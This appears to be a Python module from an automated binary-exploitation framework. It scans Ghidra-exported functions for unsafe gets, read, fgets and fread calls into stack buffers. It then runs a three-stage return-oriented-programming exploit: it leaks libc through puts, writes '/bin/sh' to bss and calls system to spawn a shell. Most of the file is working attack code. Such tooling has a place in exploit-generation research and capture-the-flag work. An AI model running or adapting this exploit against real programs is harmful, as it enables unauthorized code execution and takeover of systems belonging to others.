import logging
import pwn
import json
import smrop
import claripy

from .analyses import Vulnerability, register
from .functions import isLocal, isParameter, getLocal

logger = logging.getLogger(name=__name__)

@register
class StackBufferOverflowVulnerability(Vulnerability):
    name = "StackBufferOverflowVulnerability"
    short_name = "sbo"
    options = [("suffix", "str", "Ouput immediately after the buffer overflow call.")]
    EXPLOIT_SIZE = 0x20 #TODO: Compute this properly.

    def __init__(self,
            function,
            binary : pwn.ELF,
            libc : pwn.ELF,
            targetFunc,
            functionExit,
            stackOffset,
            bufferFunction,
            bufferSize : int = None,
            debug : bool = False):
        self.function = function
        self.binary = binary
        self.libc = libc
        self.targetFunc = targetFunc
        self.stackOffset = stackOffset
        self.functionExit = functionExit
        self.bufferFunction = bufferFunction
        self.bufferSize = bufferSize
        self.debug = debug
    
    def __str__(self):
        fields = {
            "vulnerability": "StackBufferOverflowVulnerability",
            "function": str(self.function["name"]),
            "binary": str(self.binary),
            "libc": str(self.libc),
            "targetFunc": str(self.targetFunc),
            "stackOffset": str(self.stackOffset),
            "bufferFunction": str(self.bufferFunction),
            # TODO: Make these more useful / general
            # TODO: Unify this with options above
            "bufferSize": str(self.bufferSize),
            "options": {
            }
        }
        return json.dumps(fields, indent=2)

    def __format__(self, format_spec):
        return self.__str__()

    # TODO: Make this a real thing.
    @staticmethod
    def requires(context, program, options):
        return [ELF.NO_CANARY, ELF.KNOWN_MAIN, ELF.KNOWN_POP_RDI, ELF.KNOWN_GOT]

    @staticmethod
    def bad_call_gets(call, context, function, program, options, debug=False): 
        targetFunc = call
        # assume stack for now
        # need to add check to validate
        # that the argument is on the stack.
        # otherwise, this is not exploitable
        # via this technique
        # TODO: Add check
        arg = call["arguments"][0]
        arg = [v for v in function["variables"] if v["name"] == arg]
        if len(arg) < 1:
            return
        arg = arg[0]
        stackOffset = arg["stackOffset"]
        return StackBufferOverflowVulnerability(function,
            context.binary,
            context.libc,
            targetFunc=targetFunc,
            functionExit=function["exitAddresses"][0],
            stackOffset=stackOffset,
            bufferFunction="gets",
            debug=debug)

    @staticmethod
    def bad_call_read(call, context, function, program, options, debug=False): 
        targetBuffer = call["arguments"][1]
        source_fd = call["arguments"][0]
        
        targetSize = None
        # TODO: add analysis to ghidra to export type info
        # here to figure out if it's a variable or a constant
        try:
            targetSize = int(call["arguments"][2], 16)
        except:
            return
        if source_fd == "0" and targetSize and isLocal(targetBuffer, function):
            stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
            if targetSize > (stackOffset + StackBufferOverflowVulnerability.EXPLOIT_SIZE):
                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=call,
                    functionExit=function["exitAddresses"][0],
                    stackOffset=stackOffset,
                    bufferFunction="read",
                    debug=debug)
    
    @staticmethod
    def bad_call_fgets(call, context, function, program, options, debug=False): 
        targetBuffer = call["arguments"][0]
        source_file = call["arguments"][2]
        
        targetSize = None
        # TODO: add analysis to ghidra to export type info
        # here to figure out if it's a variable or a constant
        try:
            targetSize = int(call["arguments"][1], 16)
        except:
            return
        if source_file == "stdin" and targetSize and isLocal(targetBuffer, function):
            stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
            if targetSize > (stackOffset + StackBufferOverflowVulnerability.EXPLOIT_SIZE):
                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=call,
                    functionExit=function["exitAddresses"][0],
                    stackOffset=stackOffset,
                    bufferFunction="fgets",
                    debug=debug)
    
    @staticmethod
    def bad_call_fread(call, context, function, program, options, debug=False): 
        targetBuffer = call["arguments"][0]
        source_file = call["arguments"][3]
        
        targetSize = None
        # TODO: add analysis to ghidra to export type info
        # here to figure out if it's a variable or a constant
        try:
            targetSize = int(call["arguments"][1], 16)*int(call["arguments"][2],16)
        except:
            return
        if source_file == "stdin" and targetSize and isLocal(targetBuffer, function):
            stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
            if targetSize > (stackOffset + StackBufferOverflowVulnerability.EXPLOIT_SIZE):
                return StackBufferOverflowVulnerability(function,
                    context.binary,
                    context.libc,
                    targetFunc=call,
                    functionExit=function["exitAddresses"][0],
                    stackOffset=stackOffset,
                    bufferFunction="fread",
                    bufferSize=targetSize,
                    debug=debug)

    @staticmethod
    def detect(context, function, program, options, debug=False):
        bad_calls = {
            "gets": StackBufferOverflowVulnerability.bad_call_gets,
            "read": StackBufferOverflowVulnerability.bad_call_read,
            "fgets": StackBufferOverflowVulnerability.bad_call_fgets,
            "fread": StackBufferOverflowVulnerability.bad_call_fread
        }
        for call in function["calls"]:
            try:
                if call["funcName"] in bad_calls:
                    res = bad_calls[call["funcName"]](call, context, function, program, options, debug)
                    if res:
                        return res
                    continue
            except Exception as e:
                logger.warning(f"Exception occurred while processing '{call['funcName']}': {e}")
                continue
            
        return None
    # TODO: Get this working and tested

    def entry(self):
        return int(self.function["address"], 16)

    # TODO: gate on detect
    def exploit(self, conn):
        sconn = conn.conn
        function_addr = int(self.function["address"], 16) 
        functionExit = int(self.functionExit, 16)
    
        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 1: Leak Libc")
        logger.info("#####")

        # Navigate to targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))
        self.dpause(conn)

        # Payload1: leak libc location
        prefixlen = abs(self.stackOffset)
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(self.binary.got["puts"], target='binary') # this REQUIRES puts to be present
        print("XXXX", hex(self.binary.got["puts"]))
        # TODO: make puts a dependency
        # TODO: abstract out puts to any print
        sm.ret("puts", 'binary')
        sm.ret(function_addr, "binary")
      
        # we should be leaking 'puts' here but I'm being dumb. 
        logger.info("Sending first payload (to leak 'puts' location)")
       
        payload1 = sm.resolve(binary=0x0, libc=0x0)
        if self.bufferSize:
            suffixSize = self.bufferSize - (prefixlen) - (len(payload1) + 1)
            print(suffixSize)
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen),
                                                         claripy.BVV(payload1+b"\n"),
                                                         claripy.BVS("suffix_buffer1", size=8*suffixSize)])
        else:
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen),
                                                         claripy.BVV(payload1+b"\n")])
        logger.info(f"Solution Prefix Payload: {solution_payload}")
        conn.sim_send(solution_payload)
        sconn.send(solution_payload)
        self.dpause(conn)

        logger.info(f"Navigating to function exit {self.functionExit}")
        conn.navigate(functionExit)

        # We've hit the return, next output is now the 'puts' address
        # NOTE: We *must* use a function whose got has been resolved.
        # since we're using puts anyhow, we know that it has been resolved.
        response = sconn.recvline()
        puts_location = response[:-1]
        logger.debug(f"puts_location: {puts_location}")
        puts_location = int.from_bytes(puts_location, byteorder='little')
        libcoffset = puts_location - self.libc.symbols["puts"]
        logger.info("Libc found at {}".format(hex(libcoffset)))

        # need to navigate back to the targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))
        self.dpause(conn)

        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 2: Write `/bin/sh` to writeable bss location")
        logger.info("#####")

        # Payload2: send /bin/sh
        target_heap_address = self.binary.bss() + 0x100
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(target_heap_address)
        sm.ret("gets", "binary")
        sm.ret(function_addr, "binary")
        payload2 = sm.resolve(binary=0x0)
        
        logger.info("Sending second payload (setup write to controlled memory)")
        if self.bufferSize:
            suffixSize = self.bufferSize - (prefixlen) - (len(payload2) + 1)
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2", size=8*prefixlen),
                                                         claripy.BVV(payload2+b"\n"),
                                                         claripy.BVS("suffix_buffer2", size=8*suffixSize)])
        else:
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2", size=8*prefixlen),
                                                         claripy.BVV(payload2+b"\n")])
        conn.sim_send(solution_payload)
        sconn.send(solution_payload)
        logger.info("Navigating to return.")
        self.dpause(conn)

        logger.info("Navigating to function exit")
        conn.navigate(functionExit)
        self.dpause(conn)

        # we have exited the function, we can now
        # write /bin/sh to a controlled part of memory
        logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
        conn.sim_send(b"/bin/sh\x00\n")
        sconn.send(b"/bin/sh\x00\n")
        self.dpause(conn)

        # need to navigate back to the targetFunc
        logger.info("Navigating to targetFunc.")
        conn.navigate(int(self.targetFunc["address"],16))
        self.dpause(conn)

        logger.info("#####")
        logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform system invocation")
        logger.info("#####")

        # payload3
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.pop_rdi(target_heap_address)
        sm.nop()
        sm.ret("system", "libc")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        logger.info("Sending final payload (invoke system('bin/sh'))")
        if self.bufferSize:
            suffixSize = self.bufferSize - (prefixlen) - (len(payload3) + 1)
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload3", size=8*prefixlen),
                                                         claripy.BVV(payload3+b"\n"),
                                                         claripy.BVS("suffix_buffer3", size=8*suffixSize)])
        else:
            solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload3", size=8*prefixlen),
                                                         claripy.BVV(payload3+b"\n")])
        conn.sim_send(solution_payload)
        sconn.send(solution_payload)
        self.dpause(conn)
        
        # Payload sent, now exit the function.
        logger.info("Navigating to function exit")
        conn.navigate(functionExit)
        self.dpause(conn)
        
        logger.info("We should now have a shell.")
